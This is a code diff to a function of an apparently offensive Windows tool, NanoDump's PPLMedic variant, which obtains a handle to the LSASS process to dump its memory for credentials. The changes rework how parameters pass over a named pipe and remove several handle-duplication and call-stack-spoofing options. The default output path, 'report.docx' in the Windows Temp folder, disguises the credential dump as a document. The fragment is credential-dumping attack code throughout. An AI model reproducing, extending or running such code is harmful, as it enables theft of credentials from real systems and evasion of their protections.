@@ -1312,15 +1312,12 @@ BOOL NanoDumpPPLMedic(VOID)
     /******************* change this *******************/
     LPSTR          dump_path            = "C:\\Windows\\Temp\\report.docx";
     BOOL           use_valid_sig        = FALSE;
-    BOOL           duplicate_handle     = FALSE;
-    DWORD          lsass_pid            = 0;
     BOOL           elevate_handle       = FALSE;
-    BOOL           duplicate_elevate    = FALSE;
-    DWORD          spoof_callstack      = 0;
     /***************************************************/
     dump_context   dc                   = { 0 };
     BOOL           ret_val              = FALSE;
     BOOL           success              = FALSE;
+    DWORD          lsass_pid            = 0;
     HANDLE         hProcess             = NULL;
     SIZE_T         region_size          = 0;
     PVOID          base_address         = NULL;
@@ -1333,21 +1330,18 @@ BOOL NanoDumpPPLMedic(VOID)
     HANDLE         hPipe                = NULL;
     LPSTR          dump_path            = NULL;
     BOOL           use_valid_sig        = FALSE;
-    BOOL           duplicate_handle     = FALSE;
-    DWORD          lsass_pid            = 0;
     BOOL           elevate_handle       = FALSE;
-    BOOL           duplicate_elevate    = FALSE;
-    DWORD          spoof_callstack      = 0;
     dump_context   dc                   = { 0 };
     BOOL           ret_val              = FALSE;
     BOOL           success              = FALSE;
+    DWORD          lsass_pid            = 0;
     HANDLE         hProcess             = NULL;
     SIZE_T         region_size          = 0;
     PVOID          base_address         = NULL;
     WCHAR          wcFilePath[MAX_PATH] = { 0 };
     UNICODE_STRING full_dump_path       = { 0 };
 
-    success = create_named_pipe(
+    success = server_create_named_pipe(
         IPC_PIPE_NAME,
         FALSE,
         &hPipe);
@@ -1358,20 +1352,16 @@ BOOL NanoDumpPPLMedic(VOID)
     if (!success)
         goto cleanup;
 
-    success = listen_on_named_pipe(
+    success = server_listen_on_named_pipe(
         hPipe);
     if (!success)
         goto cleanup;
 
-    success = recv_arguments_from_pipe(
+    success = server_recv_arguments_from_pipe(
         hPipe,
-        &lsass_pid,
         &dump_path,
         &use_valid_sig,
-        &duplicate_handle,
-        &elevate_handle,
-        &duplicate_elevate,
-        &spoof_callstack);
+        &elevate_handle);
     if (!success)
         goto cleanup;
 
@@ -1421,11 +1411,11 @@ BOOL NanoDumpPPLMedic(VOID)
     success = obtain_lsass_handle(
         &hProcess,
         lsass_pid,
-        duplicate_handle,
-        elevate_handle,
-        duplicate_elevate,
         FALSE,
-        spoof_callstack,
+        elevate_handle,
+        FALSE,
+        FALSE,
+        0,
         FALSE,
         NULL,
         NULL,
@@ -1504,8 +1494,11 @@ cleanup:
 #if defined(PASS_PARAMS_VIA_NAMED_PIPES) && (PASS_PARAMS_VIA_NAMED_PIPES == 1)
     if (dump_path)
         intFree(dump_path);
+    server_send_success(
+        hPipe,
+        ret_val);
     if (hPipe)
-        disconnect_pipe(hPipe);
+        server_disconnect_pipe(hPipe);
     if (hPipe)
         NtClose(hPipe);
 #endif
